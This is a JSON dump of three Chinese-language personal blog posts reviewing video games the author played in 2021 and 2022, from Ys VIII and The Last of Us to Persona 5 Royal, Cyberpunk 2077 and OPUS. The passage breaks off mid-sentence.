[{"title":"2021年游戏总结 下","url":"/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/","content":"本文承接上文，继续聊聊 2021 年我所体验的一些游戏。\n\n伊苏8：丹娜的陨涕日今年玩过最喜欢的 jrpg 作品，几乎满足了我对于一款优秀 jrpg 的全部幻想。\n\n战斗方面爽快而又不失深度。伊苏系列向来以高速的即时制战斗著称，本作也不例外，角色与敌人的动作都相对较快，技能无冷却加之技能槽的回复速度很快，因此本作的战斗与大部分 jrpg 讲究策略的慢节奏战斗有很大不同。但这并不意味着本作战斗就十分无脑，弹反、极限闪避、弱点属性等机制的加入很好的提升了战斗系统的深度。\n本作的剧情也很优秀。剧情悬念设置十分得当，给予玩家很强的故事驱动力，人物塑造极佳，进一步增强代入感。\n本作最值得夸赞的还是地图探索方面的体验。本作采用的是一个非常典型的“银河恶魔城”式的地图设计，玩家需要探索地图的各个角落，从而解锁新的能力，再次进行更深一步的探索。同时本作探索不光局限于对于物品的获取，还包括了 npc 的发现，这一切与 jrpg 的强故事驱动相结合，使得探索欲望进一步上升。\n\n最后讲讲我对于本作不满的地方。首先是本作的保卫战部分，这部分实属多余，不仅不有趣，还很大程度破坏了地图探索的连贯性与叙事节奏，纯粹只是一个获取资源的方式罢了。其次就是画面表现了，我其实并不是一个重视游戏画面表现的玩家，但无奈本作或者说 falcom 社的画面表现实在是惨不忍睹，人物建模、场景基本就是 ps2 时代水平了。但如果对此毫不在意，那《伊苏8》绝对是一款非常优秀的 jrpg 游戏。\n晶体管制作十分精良的独立游戏，完成度很高。\n\n优秀的美术和音乐自不必多说。本作最让人眼前一亮的还是那一套基于函数搭配和指令战略的一套战斗系统，这套系统本身就具有就具有很高的可玩性，同时各函数的效果还可以叠加成为新的函数，使得战斗的策略性十分丰富。\n\n本作的开发商正是开发了近年获奖无数的《哈迪斯》的 Supergiant 工作室。这非常喜欢这家工作室，不仅因为他们惊艳的美术设计，以及他们对于游戏的精雕细琢，更在于他们敢于跳出自己的舒适圈，不断尝试新的游戏类型。他们团队这十余年开发的四部作品，每一部的类型都不尽相同：从传统的 ARPG 《堡垒》，到融入了策略要素的 《晶体管》，再到融入了体育竞技要素的《柴薪》，而《哈迪斯》又是款 Roguelike 游戏，这种不拘泥于现有成功的精神真的值得所有的游戏开发者学习，《哈迪斯》如今能取得如此大的成功也可谓是众望所归。\n尼尔：自动人形 &amp; 人工生命《尼尔：自动人形》对我而言是一款特别的作品，它是我最早接触的主机游戏，也是真正让我爱上主机游戏的作品。\n\n\n事实上，我第一次游玩本作时由于种种原因并没有通关。但在去年《人工生命》的高清复刻版发售前，我又将本作重新拾起并最终通关。平心而论，《尼尔：自动人形》是一个优点和缺点都十分明显的作品。优点显而易见，MONACA 的音乐、横尾太郎的剧本以及白金的动作系统，使得本作有一个非常好的底子。但缺点也非常明显，粗糙的场景建模、遍布整个地图的空气墙，以及重复跑图的任务。战斗系统虽然非常爽快，但战斗体验却并不好，后期堆怪现象比较严重。但《尼尔：自动人形》仍然属于佳作的范畴，值得推荐给所有玩家。\n\n反观《尼尔：人工生命》的表现就不尽如人意了，作为系列的第一部作品，续作中的缺点基本继承自前作，同样的空气墙和重复跑图。此外，一代由于时代限制，场景的规模很小，地图虽然看似广袤，但实际上真正可以到达的区域很少，相比续作的开放式地图要差很多。并且由于失去了与白金合作的动作系统，即便是在高清复刻版中对原作的系统加以改进，本作的战斗仍然比较无聊。因此，本作只推荐给想要补全系列剧情的玩家。\n\n神秘海域3 &amp; 失落的遗产《神秘海域》系列补完计划的最后两作。\n\n\n在前年通关《神秘海域4》之后，我被其成熟的电影化运镜与出色的动作系统所折服，就想要补完系列的正传作品，在通关了《失落的遗产》之后，这个计划总算基本完成（初代未通关，动作系统和画面表现难以接受），因此想聊聊我对于这个系列的看法。\n和相似类型的《古墓丽影》重启三部曲相比较，神海系列显得更加纯粹，它不会出现《古墓丽影》中的支线任务、武器强化、能力加点等繁杂事项，所有的一切均为故事服务，游戏中基本没有任何的 ui 界面，主线任务的推进也主要靠着视觉上的引导。如果把新古墓三部曲比作电影化的游戏，那神海系列更像是游戏化的电影。\n\n这个系列每一作都带给玩家一场跌宕起伏的冒险旅程，2代的香巴拉，3代的千柱之城，4代埃弗瑞的宝藏，失落遗产的印度，无一不给玩家留下深刻的印象。但这类型的游戏受技术力的影响很大，PS3 时期的三部曲虽然当时广受赞誉，《神秘海域2》更是获得了当年的 TGA 年度游戏，但以现在的眼光来看，较为落后的画面和动作，加上如今大量游戏都纷纷采用了电影化的叙事方式，现在游玩已经很难体验到当年玩家所体验到的震撼了。这也是这一类型游戏的缺陷，《失落的遗产》中出现的一些与前作类似的情节确实是让人有些审美疲劳了，顽皮狗显然也是意识到了这一点，正式完结了这个系列，在我看来是非常明智的决定。\n\n最后生还者1 &amp; 2电影化动作冒险游戏的最高峰，真正意义上的杰作。\n\n\n如果说《神秘海域》系列带给玩家的情感体验只来源于感官上的刺激，那么《最后生还者》系列带给玩家的则是心灵上的震撼。不同于神海系列较为轻松的夺宝旅程，《最后生还者》讲述的则是末世下人与人的关系。与大多数类似末世题材作品致力于展现世界观不同，本系列更多关注的是 The Last of Us 中的 us，讲好一个相对小格局的故事，充分调动玩家的情感才是本系列的目的。因此本系列虽然是一个第三人称视角的游戏，但其实游戏内的视角仅仅局限在主角，玩家无法得知主角之外所发生的故事，从而让角色与玩家产生共鸣，从而带来极致的情感体验。初代也因此广受赞誉，被无数玩家奉为神作。\n\n但二代在充分继承一代框架的基础上，却带来了完全不同的效果，玩家间的评价两极分化，甚至引发了游戏圈中大规模的争论。造成这一切的原因同样是本系列的特点——强烈的情感冲击。一代由于是新 ip，故事上也没有很大的包袱，结局虽然存在争议，但并没有掀起风波。而二代的剧情实在过于极端，同时在对玩家情感上的冲击要远胜于一代，加之剧本上存在的逻辑漏洞与叙事混乱，最终使得游戏带给玩家的情绪被愤怒所填充，造成了两级分化。可以说，这样情况的出现可以说并不意外，强烈的情感体验正是系列所追求的，因此二代的故事带给玩家的如果不是像一代那样的正面反馈，那就是及其负面的反馈，而绝不可能是平淡。\n即便我同样对二代的剧本不满意，但综合系列游戏极高的制作水准（尤其是二代）与带给玩家的情感冲击，这系列都值得推荐给所有的玩家。\n\n零：濡鸦之巫女美型的日式恐怖游戏，故事、氛围和恐怖感的营造都深得我心。\n\n这个系列的核心机制——射影机系统可谓是恐怖游戏类型中一个非常经典且优秀的设计了，既很好的服务于恐怖感，又兼具很强的娱乐性。给怨灵拍照这一机制迫使玩家必须直面恐惧，带来了第一人称视角下的压迫感。同时这一机制需要玩家通过旋转相机达到伤害的最大化，这一过程本身也很有趣。另外操作方面最好使用带体感功能的手柄，不仅操作比较方便，还能很大程度上提升代入感。\n\n本作的美型人设本来应该是加分项，但是也很大程度上降低游戏的恐怖感，到了《濡鸦之巫女》这一作可以说恐怖感非常低了，推荐因为恐怖而不敢尝试本作的玩家游玩。但原作毕竟还是老游戏的移植，视角转换方面感觉没有做很多优化，操作还是比较难受，需要时间适应。\n通关本作后，我是真的喜欢上了这个系列，喜欢系列独特的氛围以及凄美的故事。这次移植大概也是在为续作的开发试水，毕竟这个系列虽然在恐怖游戏圈内名声不小，但实际销量却非常惨淡，希望今后能够等到到续作的到来。\n\n绯红结系一部有亮点但整体体验并不好的作品。\n\n本作的战斗系统可以说非常出色，兼顾了演出效果与操作感。战斗系统本身并不复杂易上手，动作招式的整体反馈非常优秀，特效与动画间的配合十分完美，尤其 xbox 版本居然还适配了扳机震动，使得打击反馈进一步提升。本作在战斗方面的体验绝对称得上优秀。\n但基本上本作能为之称道的也仅限于此了，其他方面表现得实在不尽如人意。首先是叙事，在我看来 PPT 式过场动画并不是本作叙事上的缺点，本作叙事结构本身非常混乱，剧情推动和人物动机不明不白。羁绊章节的加入也是把双刃剑，一方面确实丰满了人物性格，弥补了主线故事中人物塑造上的不足；但同时这部分内容与主线故事的割裂非常严重，以至于出现前一秒还在相互厮杀，后一秒就一起谈笑风生的情节。\n\n此外，本作本质上还是一个数值驱动的 arpg 而并非传统的 act 类型，因此装备构筑部分也值得关注。但本作这方面做得并不好，人物的 build 部分还是过于简单，没有什么可供挖掘的深度。\n感觉本作还是一个偏实验性质的作品，有亮点，但是大部分内容都显然没有经过打磨。\n刺客信条：起源个人第一部通关的《刺客信条》。\n\n本作前期的体验可以说非常好，场景设计非常宏伟壮观，很好的还原了古埃及建筑的风貌。古墓探索设计还算不错，虽然古墓中谜题并不有趣，但探索本身就已充满乐趣。开放世界非常宽广，各地风格迥异，让人很有开图的欲望。\n\n但以上所述的这些优点更多来自于画面效果和题材本身所带来的体验，越玩到后期，游戏的很多问题就逐渐显露出来。首先是叙事，剧情本身就不具备很强的吸引力，加上叙事的表现力太弱，使得剧情所带来的驱动力不足。\n其次战斗系统缺乏深度和乐趣，不足以承载起后期大量的重复战斗。对比同样是开放世界“清据点式”任务的《对马岛之魂》，后者虽然战斗同样缺乏深度，但其战斗本身更加有趣，并且合理控制了战斗的密度，使得战斗的体验要远胜于本作。\n\n最后，也是我最难以忍受的一点，就是等级压制过于严重。如果只做主线任务，玩家无法达到继续推进主线任务的推荐等级，而且等级之间的数值差距非常悬殊，通常越个两三级就很容易被秒杀。但支线任务往往并不有趣，这使得后期的游戏体验直线下降，只想快速通关。\n","categories":["游戏"],"tags":["游戏","闲谈"]},{"title":"2021年游戏总结 上","url":"/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/","content":"​    转眼间 2021 年已经过去，这一年间也体验了很多不同平台、不同类型的作品。本文将对此做一个小小的总结，内容主要是个人对 2021 年玩过的游戏的一些个人想法。此外，由于篇幅受限，因此并不会包含所有的游戏，部分体验不够深入的或者无话可聊的游戏将不会出现。\n\n双人成形这算是今年玩过的最开心的游戏了，和两个室友花了大概 15 小时通关。\n\n游戏在本身的关卡设计就很优秀，在融合了双人机制下更加显得精妙。且游戏对于资源的利用可谓毫不吝啬，每一大关就完全舍弃掉之前机制，完全变成“另一个游戏”。虽然这样各种机制浅尝辄止的设计理念可能会带来所谓的游戏深度不足，但这并不是本作所追求的，本作就是想给玩家一个极为丰富的一周目流程。仔细想想现在很多游戏的流程越来越长，但很多内容都是注水的，玩家在这些重复劳动的过程中可能会对游戏失去兴趣，最终导致游戏烂尾。而双人成形就是一个每个关卡细节精心编排打磨，每种机制总能在玩家感到无聊之前及时结束，从而转向新的机制。我在实际游戏过程中的感受也是如此，对之后关卡机制的期待是我在现在大部分游戏中所体会不到的。\n\n还有一点值得提的就是本作的箱庭式关卡设计，几乎每个关卡都会有一个箱庭式的“游乐园”以供调节游戏节奏。这些箱庭式关卡中遍布着的大量可供游玩的小物件，很多都是童年时的一些小玩具，看到让人会心一笑。本作中唯一的收集元素也是可以游玩的，它们是一些双人对战的小游戏，例如打地鼠之类的，很大程度上增进了玩家之间的感情（bushi）。\n见证者本作绝对是今年给我最大震撼的游戏，它让我认识一位偏执的布道者—— Jonathan Blow 以及他所贯彻的游戏哲学。\n\n游戏最开始给人的印象只是一个简单的一笔画小游戏，但随着游戏进程的推进，玩家会发现基于这样一个极为简单的规则所衍生出的无数种可能性：例如镜像式的一笔画，将区域分块，构造指定形状等等。同时，部分谜题的设计不光基于 Pad（解题板） 本身，还与周围的环境相联系。有的谜题需要玩家在指定的角度观察才能看到答案；有的谜题则是将周围的环境进行抽象从而得到答案；还有的甚至需要根据环境的声音来得到答案。\n\n不仅于此，本作所呈现出来的整体感更是极为难得的。游戏几乎没有任何的 ui 界面，玩家与对于场景的机关控制同样是根据本作的核心机制——一笔画来实现的，这样的设计看似没有什么用处，实际上却极大地使得整个游戏系统更加合理自洽。\n事实上，本作的谜题并不仅仅局限于 Pad 上的抽象线条，而是这一规则融入了整个游戏的地图之中。在游戏中，玩家可以在地图的各个角落找到 Pad 上的“蝌蚪文”图案，并且作为游戏的隐藏要素而存在。而类似这样的环境谜题事实上是 Blow 本人最开始真正想做的内容，而 Pad 上的谜题反而是后来才加上去的。\n\n《见证者》是一个非常反传统的游戏，它与市面上几乎所有的游戏都有所区别。它所追求的是无奖励机制，这意味着玩家在解决谜题后事实上几乎不会得到任何的直接奖励，它的奖励只是玩家对游戏系统更深的理解，从这一角度上说，《见证者》相比其它游戏来讲更加纯粹。玩家通关游戏之后，一切归为原点，留下的只是玩家对游戏规则的更深层次的认知。\n整个《见证者》的旅途其实就是一场追寻真理的旅途。回想人类文明的发展历程，自然界中很多的现象和规律并不在某一时间节点突然出现，它们其实一直都存在，只是当时人们对于世界的认知过于浅显，对此并没有感知。《见证者》的游戏历程亦是如此，如果在通关后重新开始游戏流程会发现，很多环境谜题都存在于游戏较为前期的区域，甚至游戏游戏隐藏结局的入口就存在于游戏最早期的场景，只是当时的玩家并不会注意到这一切。这样的设计也与本作所要传达的思想高度契合。\n极限竞速：地平线5早就听过这个系列的大名，直到今年入了 Xbox Series S 后才真正入坑该系列。\n\n本作作为半娱乐半拟真的竞速游戏，可以说几乎适合所有对竞速游戏不反感的人游玩。首先是辅助功能非常完备，玩家可以非常深度的对游戏的难度进行定制。不想要复杂操作的玩家可以将尽量开启辅助功能跑跑圈看看风景，而渴望拟真竞速的硬核玩家也可以关闭一定的辅助功能体验不断练习提升技术的过程。\n这个系列之所以那么令人着迷以至于成为如今娱乐竞速游戏的天花板很大程度上要归功于这个在如今游戏业界显得不那么正面的“公式化开放世界”。事实上，本作的开放世界非常的公式化，场景中遍布着供处理的清单任务，有的是比赛，还有的是供收集的广告牌和房车宝物等等。但是由于本作实质上是一个竞速游戏，竞速游戏的核心玩法就是跑图，因此公式化开放世界所为人诟病的重复性高、跑图繁琐等缺点在本作中都不再是缺点，它们共同是构建起了整个游戏的 GamePlay 部分。\n本系列可能不是最好的竞速游戏，但一定是玩起来最开心的竞速游戏。\n以下是我在游玩过程中的部分截图。\n\n\n\n\nFIFA 21本作毫不意外的成为了我 2021 年游戏时间最长的游戏（第二是 FIFA 20）。\n\n作为年货足球游戏，在实况足球最新作转为免费游戏后算是真正成为了单机足球玩家的唯一选择了。游戏本身内容没有什么好聊的，简单聊聊它相比 FIFA 20 有哪些变化。\n由于我几乎只玩生涯模式，因此也只关心生涯模式的变化。总而言之，本次生涯模式的改变并没有达到预期。比较大的一个改变是更改球员所踢的位置并且球员能力可以根据特定位置进行针对性的提升，这一点我觉得还是很不错的。此外球员的模拟训练会直接根据训练达到的最大评级自动进行，不用反复进行手动训练了，这也是一个比较好的改变。但印象中除此之外的改变就不明显了，尤其是球员生涯模式，几乎没有什么提升，还是糟糕的站位问题，仍然无法替补登场，位置设定仍然非常不合理。希望后面的作品能够有所改善。\n伊迪斯芬奇的记忆电子游戏相较于其他艺术形式的最主要区别在哪？答案是交互性。而《伊迪斯芬奇的记忆》就是这样一个利用游戏的交互性将叙事能力发挥到极致的作品。\n\n本作作为步行模拟器，并没有传统游戏中所谓的“玩法”，或者说，本作的玩法其实就是它的交互式叙事部分。游戏中的字幕并不像其它游戏那样作为 ui 层，独立于游戏之外，而是嵌入在游戏之中，作为一个整体，这样极大了提升游戏的沉浸感。\n\n本作的叙事手法简直就是天马行空，利用十余个不同的表现形式极为自然的阐述了芬奇家族人们因为意外而去世的过程。死亡本是个无比沉重的话题，游戏中家族成员的死亡方式又基本是突然的意外死亡，游戏却用极为华丽的手法将死亡渲染的轰轰烈烈，并且这一切都与玩家的交互密切相关，真正将游戏这种艺术形式的特点发挥的淋漓尽致。\n小小梦魇2综合素质非常优秀的恐怖冒险解谜游戏。《小小梦魇2》大体上沿袭了一代的框架，并没有做出什么比较大的改变，但整体的游玩体验上却比一代好上不少。\n\n首先是谜题设计有一定提升。一代给我的感觉更偏向于动作冒险游戏，谜题的量不多且质量也一般，但二代在这方面有比较明显的提升。尤其部分关卡的隐性引导做得很好，十分自然地提示给玩家谜题的解决方案。\n\n其次就是关卡节奏上，每个部分间的衔接过渡非常自然，潜入、逃脱、解密三者以一个非常合理的比例分配在整个游戏流程之中，让玩家时刻保持在心流状态下。本作流程并不长，我通关大概花了 7 小时，由于本作出色的节奏控制，我几乎是一口气通关的。\n\n最后还想聊一聊这个系列的 3D 场景，本系列的 3D 场景无疑是把双刃剑。一方面它极大的增强了游戏的氛围和敌人的压迫感；但另一方面它使得系列的操作和跳跃判定十分糟糕，这些问题即使到了二代也依旧存在。因为角色与互动对象不在同一个 z 轴从而互动失败的情况屡屡发生。还有一点令人失望的部分在于本作的牵手系统更像是对上田文人《ico》的致敬，而并没有我最初想像的将其融合到游戏机制当中，但这也无伤大雅。综合来看，《小小梦魇2》绝对是一款不容错过的作品。\n空洞骑士独立游戏中的“大作”，本作的内容非常丰富并且完成度很高。\n\n本作用一个不那么友好的词来形容就是“缝合怪”，大体框架继承自 Metroveinia 的自由探索玩法，死亡机制与隐性叙事又借鉴自《黑暗之魂》系列。但《空洞骑士》却不是一个拙劣模仿的产物，它很好的将这些要素加以融合，加之一定的微创新，最终形成了属于自己的一套框架。\n我认为本作设计非常好的一个机制便是地图标记，玩家可以在一些当前需要特定能力解锁的区域添加特定的标记，以便后续针对性的探索。这样很好的解决了银河恶魔城游戏迷路的窘境，同时极大地增强了地图的探索欲望。本作的另一个亮点就是它的战斗系统，战斗系统虽然并不复杂，但是本作出色的手感调教和 boss 战设计使得这样简约而不简单的战斗十分流畅且具有观赏性。制作组显然也是知道本作的优势所在，于是在后面的版本中更新了 boss rush 模式，也成为了很多玩家研究练习的舞台。\n\n但本作也并非做到完美，它在玩家体验层面上还是有很多不令人满意的部分。首先便是平台跳跃关卡，个人认为这个部分确实有些多余，主要原因还是本作的跳跃手感实在不敢恭维，加上这一部分与其它关卡体验上有些割裂。其次就是本作难度曲线控制并不平稳，很大程度上还是游戏对于玩家的关卡引导不够明确，玩家很容易陷入此时的关卡是否是主线目的地的困惑当中，这样的情况会遍布在游戏的整个流程，使得整个游戏流程体验较为破碎。\n但本作的整体优异表现还是值得推荐给所有喜欢银河恶魔城游戏的玩家，话说丝之歌怎么就没消息了呢？\n影子工厂《去月球》系列的第三部也可能是最后一部作品，又是一个美好且温馨的故事。\n\n本作故事上的冲击性可能没有前作《去月球》和《寻找天堂》来的强烈，但却是成为了我三部作品中最喜欢的一部。很大的原因是本作引入了更多叙事上的技法，悬念设计相较以往作品更为出色，最后以一个十分美好且令前作玩家震惊的方式将三部曲串联起来，为三部曲画上一个完美的句号（大概）。本作的故事值得反复回味，不得不佩服高瞰老师对于人物情感上的刻画，让一个比较普通的不能再普通的故事讲述的如此令人动容。\n\n此外本作基本舍弃了那些与叙事无关的“小游戏”部分，个人认为这是非常明智的选择。前两作可能是为了更加贴近所谓的游戏，而比较强行地加入类似拼图等小游戏，但这些与游戏实际玩法割裂的部分在我看来实际上打乱了游戏的节奏。而本作在叙事上给我的感受就是流畅，全程无尿点，时刻都有一定的悬念吸引着玩家。\n虽然本作与前两部作品在剧情上并无直接关联，但还是建议至少游玩前面任意一作体验会更好。\n","categories":["游戏"],"tags":["游戏","闲谈"]},{"title":"2022年游戏总结","url":"/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/","content":"今年由于要准备考研，博客几乎没怎么更新，游戏玩的也比较少，算上填坑、试玩、弃坑的粗略计算大概 20 款，其中不乏近年的新游戏以及一直想补的老游戏，以下是从中选出的几款个人觉得比较有的聊的作品。\n\n勇者斗恶龙11s 寻觅逝去的时光\n国民级 jrpg 系列的最新作品，各方面都非常均衡，角色构筑、战斗系统、隐藏要素的设计已经相当成熟。给我印象最深刻的还是本作的数值设计，将游戏流程的难度曲线设置的非常平缓，正常推进流程的情况下，既不会让战斗太过困难，也不会让战斗太过简单，整体战斗节奏非常舒适。剧情部分虽然较为王道，但人物性格塑造不错，能够让人代入其中，同时也有诸如人鱼的故事这样动人的剧情。\n本作作为传统 jrpg 给我的感觉就是一切做的都很不错，但总感觉还差那么一口气，整体上设计还是过于保守，没有让我感到特别惊艳的地方。同时很多设计放在今天来看确实有点过时了，主要还是大量无聊的重复劳动，尽管特别的二周目剧情算是一个亮点，但也意味着要重新体验一遍几乎一样的流程，放在今天确实是很难以让人坚持的。另外本作的配乐由于大量沿用了以往作品的配乐，原创配乐不多，虽然单听确实还不错，但与游戏本身的故事结合并不好，在城镇重复的交响乐反倒让人感觉很吵。\n用一句话总结本作：如果 jrpg 设计有模板的话，那就应该是这样，一切都是传统的味道。但我个人还是希望系列能够在保留 jrpg 传统设计的同时，尽可能加入一些符合现代游戏设计理念的元素。\n女神异闻录5 皇家版\n本作其实是从去年 8 月份开的坑，期间由于种种原因搁置了，直到今年才真正通关，总游戏时长约 100 小时。\n本作可以说是现在综合素质最优秀的 jrpg 作品之一了，jrpg 核心的音乐、人设、对白、战斗系统各方面都非常优秀，几乎很难找出缺点。尤其要吹一吹本作的 UI 设计，在本身具备极佳的美观性和时髦值的同时，又拥有很强的实用性。具体体现在游戏中的很多菜单切换都非常合理且便捷，尤其是战斗时的按键操作被很好的简化，配上本作相较于传统 jrpg 快节奏的战斗与炫酷流畅的演出效果，使得原本较为重复的回合制战斗显得毫不枯燥乏味。\n\n对于 Persona 系列这种按日期来推进游戏流程的游戏模式，开始时还觉得节奏较慢，内容重复且限制较多，但越玩到后面越喜欢，精心设计的不少诙谐幽默的对话使得日常部分非常轻松而又有趣。此外，系列发展到第五代，其标志性的面具合成系统已经非常成熟，兼具深度和趣味性，在天鹅绒房间听着《全ての人の魂の诗》纠结面具的合成选择已经成了游戏中后期的常态。同时本作的迷宫设计也非常优秀，不仅迷宫本身的关卡设计过硬，且各迷宫风格迥异的美术设计与叙事部分结合的非常好。轻松的日常与优秀的战斗两者相结合就使得是本作如此让人沉迷。\n夸了这么多，但我对本作不满的地方也不是没有，主要是角色羁绊部分做得还不够完善，角色的羁绊剧情基本上和游戏主线是两个世界，既不会受到主线的限制也对主线几乎没有影响，而且羁绊的剧情部分也乏善可陈。但也可以理解，这方面想做好确实比较困难，但我还是期待未来的六代能够在这方面有所改进。\n综合来讲本作绝对是我最喜欢的 jrpg 作品之一，同时也是近年最好的 jrpg 之一。\n最终幻想13-2\n个人“最终幻想补完计划”的又一部作品，之前有尝试过 ff13 本篇，但由于较为无趣的战斗系统和过于死板的单线流程而弃坑，本来对这一作并不抱太大期望，没想到意外的还不错。\n作为《最终幻想》正传系列作品，音画表现必然不会拉跨，尽管本作还是发售于 2011 年的 ps3 时代的老游戏，但其画面素质依然不逊色于如今大多数日系厂商的最新作品。我尤其偏爱本作的音乐风格，将系列一贯的幻想风格与本作的科技感很好的结合，放在今天依然非常惊艳。\n\n13 本篇或许是由于过于注重技术力和演出效果把 rpg 的核心系统给丢了，本作在这方面有很大的改进：更加富有策略性的战斗系统和具备很大构筑空间的怪物系统让本作的战斗具备一定深度。前作单线流程部分给人的感觉就是沿着单行道前往一个新的场景，路途中打个怪再播个片，反复循环，即便流程存在一些岔路，但也基本不存在任何关卡设计。而本作在一开始就把空间上的限制放开，新颖的时间穿越系统不仅很好的为叙事服务，而且还赋予本作很强的探索空间，找回了 jrpg 本源的冒险感。虽然 rpg 部分的设计还称不上优秀，但整体的体验还是不错的。\n最后稍微提一嘴本作的剧本，或者说是整个 ff13 三部曲的剧本。ff13 系列的世界观太过庞大且复杂，而且叙事又很隐晦，整体玩下来让人一头雾水，很多地方的情节又缺乏逻辑。ff13，包括个人特别喜欢的 ff15 这两代的剧本部分感觉路越走越偏了，世界观设定新奇且华丽，但剧情本身和人物塑造部分却非常空洞，远不及以往作品给人的印象深刻。希望 ff16 在回归传统剑与魔法世界观后剧本部分能够回到正轨，重新找回系列最初给人的那份感动。\n弹丸论破 希望学园与绝望高中生\n本作也不是今年才开始玩的，之前就在 psv 上体验过一阵，感觉风格过于怪异就没往下玩，直到今年加入 xgp 之后才想着重新开坑。\n正如上面所提到的，本作的风格和人设都很“怪”，初次上手的直观感受就是二次元浓度爆表，给人感觉这不是什么正经游戏。但在通关之后却发现本作在猎奇的外表下，藏着的却是一个正儿八经文字推理游戏的内核。推理部分和悬念设计非常优秀，看似荒诞胡闹的现象最终都会有一个明确的解释。另外必须夸一夸本作的人设，本作的人设虽然很多时候过于浮夸，但这样做的好处是能够给玩家留下深刻的印象，玩家能在脑海中对每个人物有一个感性的认识，制作组也很好地利用了这一点，在推理环节给玩家设置了重重陷阱，让人惊觉脑洞之大。\n系列的定位是“高速推理游戏”，各种花里胡哨的辩论效果让人眼前一亮，但随之附带的动作系统个人却不太能接受，不过好在游戏提供了简易模式。总的来说，只要能接受本作猎奇的设定，同时还对文字推理游戏感兴趣的话，本作还是一部不容错过的作品。\n赛博朋克2077\n原本在宣发阶段还以为是一个赛博朋克式的 gta，但事实上本作还是一个典型的 cdpr 式的作品，一个以跌宕起伏的故事和多样的分支选择为核心的 rpg.\n优点自不必多说，《巫师3》在叙事上的优秀表现在这一代得到了很好的继承，多样且戏剧化的支线任务遍布了整个夜之城。同时，本作相较于《巫师3》相比同类游戏较弱的演出效果，极大地强化了主线流程的表现力，加之第一人称下更强的代入感和优秀的中文配音的加入，主线剧情的表现力绝对可以说是超一流的水准，整体的叙事表现相较于《巫师3》又有了长足的进步。\n\n但或许是 cdpr 第一次尝试以现代都市为背景的开放世界，本作的开放世界的设计简直是无聊至极，整个城市构建的毫无真实感可言，愚蠢的路人 AI 和过少的交互元素都让这个偌大的夜之城难以让人沉浸。另外 rpg 的系统上个人认为也不那么有趣，尽管《巫师3》的整个 rpg 系统也不算优秀，但至少也存在像装备藏宝图这样很具探索感的设计，但本作的整个装备构筑部分个人基本找不到什么可玩点。可能我是一个更偏向于日系游戏的玩家，很难接受美式 rpg 中过于冗杂的装备系统，体现在本作中就是一场战斗下来捡了一堆武器，但事实上能用的寥寥无几，大多数都是留着卖钱的垃圾，不同武器所带来的数值提升也显得非常随意，很难体会到 jrpg 中那种角色能力成长所带来的数值之美。整个流程的战斗系统我基本上都没怎么研究，就这么硬着头皮通关了游戏，这部分的内容对我来说相较于《巫师3》是完全倒退的。\n事实上本作也不是今年才接触的，当时还没有买新主机的时候就早早预购了游戏的 ps4 版本，最后的结果就不必多说了，游戏的首发版本不仅 bug 多到令人发指，而且在上世代主机上基本是一个不可玩的状态，最后不得已卖掉了二手盘。直到今年次世代更新的发布，我又在 xbox 上买了一份，xss 上能以 1080p 动态分辨率以 60 帧稳定运行，体验已经很不错了，但即便如此，我在整个游戏流程中遇到的 bug 依然高于大多数游戏的首发版本，可见当初首发坚持通关的玩家经历了什么…\n灵魂旅者\n一款非常温暖治愈的游戏，游戏的基本内容是玩家扮演一名灵魂摆渡人，寻找散落在各个岛上的逝者灵魂，与他们互动，完成他们的心愿，并最终与他们告别。玩法部分简单描述就是模拟经营，玩家需要收集各种素材，为船上建造厨房、农场、果园等各种建筑，以此满足主线任务推进的需要。\n游戏给人的初印象就是悠扬舒缓的音乐和精美的 2d 手绘画面，营造了一种非常温暖治愈的氛围。游戏最值得称道的还要属玩家与 npc 那极其细致的交互，船上的逝者灵魂并非只是每天等待着玩家的服务，他们每一位都在船上担当着一定的任务，包括加工麻线、制作点心等等。虽然这些机制实际上不会对玩家的任务有太大的影响，但却很好的加深了玩家与 npc 的羁绊，为最后的离别奠定了情感基础。当然，游戏在交互方面给我留下最深刻印象的，也是当初吸引我入坑的部分还是游戏独特的拥抱系统，与每位 npc 拥抱的动画做得非常生动细致，同时这一机制又贯穿于整个游戏，npc 在不开心时，玩家可以选择拥抱改善他的心情，最终离别的时刻，拥抱又是作为玩家与 npc 的最后一次互动而出现，兼具功能性和情感传达，可以说是整个游戏的点睛之笔。\n\n游戏的 gameplay 部分也很好的契合了游戏的舒缓节奏，素材的收集和加工并非一键完成，而是由各种小游戏所填充，包括砍树、冶炼、纺织都需要玩家手动来完成。但世上没有完美的设计，这一机制初见确实很有趣，但越到游戏后期，随着系统的愈发复杂和玩家的任务量的增加，就越能感到该系统所带来的疲惫感。其实整个《灵魂旅者》的游戏体验也是如此，在没有对各机制感到乏味时感觉特别惊艳，但后面过多的重复劳动还是很大程度上打消了玩家的热情，如果游戏能对流程进行一定程度的精简，想必体验上会好不少。\n事实上本作我现在也还没有通关，但我想有时间一定会打完的。\nOPUS 龙脉常歌\n这可能是我玩过最喜欢的叙事类游戏之一。\n游戏由中国台湾工作室 Sigono Games 开发，故事的世界观设定新颖，很好地将中国神话与太空背景相结合，诸如名为“烛龙”的太阳和名为“大荒”的黑洞这样的称谓在游戏中大量存在，虽然整体体验下来这样的设定更多只是一个表皮，而且游戏的剧情本身与太空背景的结合也并不紧密，更像是一个披着科幻外衣的传统故事。但这丝毫不影响我对它的评价，能看到一个洋溢着中国传统文化的科幻故事本身就已经很满足了。\n游戏的故事情节本身其实并不算有多么令人意外，甚至还有些俗套，部分情节显得过于巧合，甚至游戏的最终结局在开头就已告知玩家，但它还是凭借优秀的叙事和人物刻画让故事深入人心，成为我今年印象最为深刻的旅程。不同于很多西方和日式情节，本作男女主之间的感情表现的非常克制，而在这样克制的行为举动中玩家却能深刻的体会到他们的之间的羁绊，这种感觉很像之前《最终幻想9》给过我的感受，无需直接的言语表述便以深入人心。另外，限于游戏体量的大小，本作登场的角色数量并不算太多，但都塑造的各具特点，各人物在剧情的推动上都起到了或多或少的作用，绝无工具人的存在。\n音乐部分也值得一提，本作音乐其实单拿出来听似乎并不算很好听，能给人留下印象的也不多，但与故事剧情的结合却非常好，音乐总会在剧情的某一关键节点响起，与制作组精心准备的演出相结合，给玩家带来足够的情感冲击。另外，本作现在的版本是加入了配音的，包括中文和日文配音，因为觉得台配的中文配音稍微有点出戏，就选择了日文配音。\n我个人其实很少玩 galgame 